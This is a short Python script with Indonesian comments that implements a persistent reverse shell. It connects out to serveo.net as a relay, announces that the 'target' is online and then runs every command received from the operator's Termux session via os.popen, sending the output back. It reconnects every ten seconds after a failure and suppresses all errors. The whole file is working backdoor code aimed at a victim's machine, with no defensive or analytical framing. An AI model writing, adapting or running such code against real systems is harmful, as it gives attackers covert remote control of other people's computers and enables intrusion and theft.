import socket
import time
import os

def connect():
    # Alamat Serveo sebagai perantara
    host = "serveo.net" 
    port = 80
    
    while True:
        try:
            # Membuat koneksi socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            # Pesan penanda bahwa target sudah masuk
            s.send(b"[*] TARGET ONLINE - SIAP MENERIMA PERINTAH\n")
            
            while True:
                # Menunggu perintah dari Termux kamu
                data = s.recv(1024).decode().strip()
                if not data:
                    break
                
                # Menjalankan perintah yang kamu ketik di Termux
                # Hasilnya akan dikirim balik ke layar Termux kamu
                output = os.popen(data).read()
                if not output:
                    output = "[+] Perintah dijalankan (tanpa output)\n"
                s.send(output.encode())
        except:
            # Jika koneksi putus, tunggu 10 detik lalu coba hubungkan lagi otomatis
            time.sleep(10)

if __name__ == "__main__":
    connect()
